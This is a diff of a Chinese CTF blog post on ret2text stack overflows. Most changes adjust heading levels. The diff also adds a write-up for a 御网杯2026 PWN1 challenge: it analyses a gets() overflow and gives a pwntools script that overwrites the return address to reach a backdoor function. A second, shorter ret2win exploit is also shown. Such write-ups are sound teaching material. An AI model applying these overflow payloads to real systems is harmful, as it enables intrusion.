@@ -2,7 +2,7 @@
 title: Pwn_栈溢出ret2text
 description: pwn-第1部分栈溢出ret2text
 date: 2026-05-18 12:09:37
-updated: 2026-05-18 12:09:37
+updated: 2026-05-31 14:30:00
 image: https://images.cnblogs.com/cnblogs_com/blogs/860797/galleries/2492655/o_260518052358_f24c3ec431c9714451d392a97b452f5e2ba79818_raw.jpg
 categories: [pwn, 安全]
 tags: [栈溢出, pwn]
@@ -10,7 +10,7 @@ recommend: 10
 path: /2026/pwn-stack-overflow
 ---
 
-## 栈溢出-ret2text
+# 栈溢出-ret2text
 
 > ## 栈溢出漏洞 (Stack Buffer Overflow) 原理分析
 >
@@ -47,7 +47,7 @@ ret2text的原理
 
 ## 
 
-### 1.攻防pwn-P2
+## 1.攻防pwn-P2
 
 这是一题简单的整数溢出
 
@@ -318,7 +318,7 @@ r.interactive()
 
 ---
 
-### 2.[SWPUCTF 2021 新生赛]gift_pwn
+## 2.[SWPUCTF 2021 新生赛]gift_pwn
 
 题目链接：https://www.nssctf.cn/problem/390
 
@@ -423,7 +423,7 @@ r.interactive()
 
 ---
 
-### 3.[SWPUCTF 2022 新生赛]Does your nc work？
+## 3.[SWPUCTF 2022 新生赛]Does your nc work？
 
 ::alert{icon="ph:files-duotone" color="var(--c-accent)" title="题目链接"}
 
@@ -472,7 +472,7 @@ nc node5.anna.nssctf.cn 22113 #nc 服务器,端口
 
 ---
 
-### 4.[CISCN 2019华北]PWN1
+## 4.[CISCN 2019华北]PWN1
 
 ::alert{icon="ph:files-duotone" color="var(--c-accent)" title="题目链接"}
 
@@ -594,7 +594,7 @@ r.interactive()
 
 ---
 
-### 5.[BJDCTF 2020]babystack
+## 5.[BJDCTF 2020]babystack
 
 ::alert{icon="ph:files-duotone" color="var(--c-accent)" title="题目链接"}
 
@@ -644,7 +644,7 @@ r.interactive()
 
 
 
-### 6.[BJDCTF 2020]babystack2.0
+## 6.[BJDCTF 2020]babystack2.0
 
 ::alert{icon="ph:files-duotone" color="var(--c-accent)" title="题目链接"}
 
@@ -695,7 +695,7 @@ r.interactive()
 
 
 
-### 7.[watevrCTF 2019]Voting Machine 1
+## 7.[watevrCTF 2019]Voting Machine 1
 
 ::alert{icon="ph:files-duotone" color="var(--c-accent)" title="题目链接"}
 
@@ -781,7 +781,7 @@ r.interactive()
 
 ---
 
-### 8.[Zero-G 2026] pwn1-Starport Ret2win
+## 8.[Zero-G 2026] pwn1-Starport Ret2win
 
 简单的栈溢出,ret2shellcode
 
@@ -790,7 +790,7 @@ r.interactive()
 
 ::
 
-#### 0x01 分析程序
+### 0x01 分析程序
 
 该程序为64位程序 
 发现栈溢出read读取超过buf数组。
@@ -829,7 +829,7 @@ void __noreturn win()
 
 ---
 
-#### 0x02 攻击链EXP
+### 0x02 攻击链EXP
 
 ```python
 from pwn import *
@@ -846,4 +846,69 @@ payload = b'a'*offset+p64(ret)+p64(win)
 r.sendline(payload)
 r.interactive()
 ```
+
+---
+
+
+
+## 9.[御网杯2026] PWN1
+
+::alert{icon="ph:files-duotone" color="var(--c-accent)" title="题目链接"}
+
+等待上传，请稍后
+
+::
+
+### 0x01 分析程序
+
+![image-20260531135614862](https://img2024.cnblogs.com/blog/3726946/202605/3726946-20260531143209285-1718050618.png)
+
+main()
+
+![image-20260531135534750](https://img2024.cnblogs.com/blog/3726946/202605/3726946-20260531143208665-322854417.png)
+
+![image-20260531135543746](https://img2024.cnblogs.com/blog/3726946/202605/3726946-20260531143208291-1352235373.png)
+
+backdoor
+
+![image-20260531143042789](https://img2024.cnblogs.com/blog/3726946/202605/3726946-20260531143207519-316554612.png)
+
+简单的栈溢出，这题就是通过
+
+gets()函数无边界检查，从 [rbp-0x80] 开始写入，可一直向上溢出覆盖 saved rbp 和 return address。
+
+这就是很简单的栈溢出了
+
+```asm
+漏洞函数
+system_addr = 0x4011f6
+```
+
+---
+
+
+
+### 0x02 EXP
+
+```python
+from pwn import *
+
+context(os='linux', arch='amd64')
+
+r = process('./vuln')
+r.recvuntil(b'Username: ')
+r.sendline(b'admin')
+offset = 0x80+0x8
+system = 0x04011F6
+ret = 0x04012A6
+payload = b'A'*offset +p64(ret)+p64(system)
+
+r.sendline(payload)
+r.interactive()
+
+```
+
+---
+
+
 
